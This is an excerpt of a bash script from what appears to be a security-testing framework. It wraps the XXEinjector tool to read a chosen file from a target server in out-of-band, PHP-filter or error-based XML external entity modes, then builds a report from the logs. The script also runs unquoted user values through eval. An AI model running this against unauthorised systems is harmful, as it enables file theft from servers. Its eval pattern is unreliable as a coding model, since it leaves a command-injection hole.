...
while [ "$#" -gt 0 ]; do
  case "$1" in
    ...
    --output=*) OUTPUT_DIR="${1#*=}"; shift 1;;
    --cookie=*) COOKIE="${1#*=}"; shift 1;;
...
XXE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../vulnerability_scan/xxe" && pwd)"

if [ ! -d "$XXE_DIR/XXEinjector" ]; then
    echo -e "${RED}[-] XXEinjector directory not found in $XXE_DIR. Please ensure it was cloned properly.${NC}"
    exit 1
fi
...
if [ -n "$OUTPUT_DIR" ]; then
    ...
    RESULTS_DIR="$(cd "$SCRIPT_DIR/../../.." && pwd)/Data/xxe_results/xxe_${TIMESTAMP}"
fi
mkdir -p "$RESULTS_DIR"
...
cat "$XXE_DIR/xxe_templates/stock_check.txt" | sed "s|TARGET_HOST|$(echo $TARGET | awk -F/ '{print $3}')|g" > "$TEMP_REQ"
...
if [ "$MODE" = "full" ]; then
    ...
    COMMAND1="ruby $XXE_DIR/XXEinjector/XXEinjector.rb --host=${HOST:-127.0.0.1} --file=${TEMP_REQ} --path=${FILE_TO_READ} --oob=http --output=${RESULTS_DIR} --fast"
    eval "yes n | $COMMAND1 2>&1" | tee -a "${RESULTS_DIR}/xxeinjector.log"
    
    echo -e "${BLUE}[*] Executing PHP Filter Test...${NC}"
    COMMAND2="ruby $XXE_DIR/XXEinjector/XXEinjector.rb --host=${HOST:-127.0.0.1} --file=${TEMP_REQ} --path=${FILE_TO_READ} --phpfilter --output=${RESULTS_DIR} --fast"
    eval "yes n | $COMMAND2 2>&1" | tee -a "${RESULTS_DIR}/xxeinjector.log"
else
    COMMAND="ruby $XXE_DIR/XXEinjector/XXEinjector.rb --host=${HOST:-127.0.0.1} --file=${TEMP_REQ} --path=${FILE_TO_READ} --output=${RESULTS_DIR} --fast"
    if [ "$MODE" = "blind-oob" ]; then COMMAND="$COMMAND --oob=http"; fi
    if [ "$MODE" = "error-based" ]; then COMMAND="$COMMAND --expect"; fi

    echo -e "${BLUE}[*] Executing: $COMMAND${NC}"
    eval "yes n | $COMMAND 2>&1" | tee -a "${RESULTS_DIR}/xxeinjector.log"
fi
...
python3 "$XXE_DIR/xxe_analyzer.py" --target "$TARGET" --mode "$MODE" --duration "$DURATION_STR" --logdir "$RESULTS_DIR" > "${RESULTS_DIR}/results.txt"

# Print the report to console as well
cat "${RESULTS_DIR}/results.txt"

echo -e "${GREEN}[+] Scan finished. Full report saved to ${RESULTS_DIR}/results.txt${NC}"
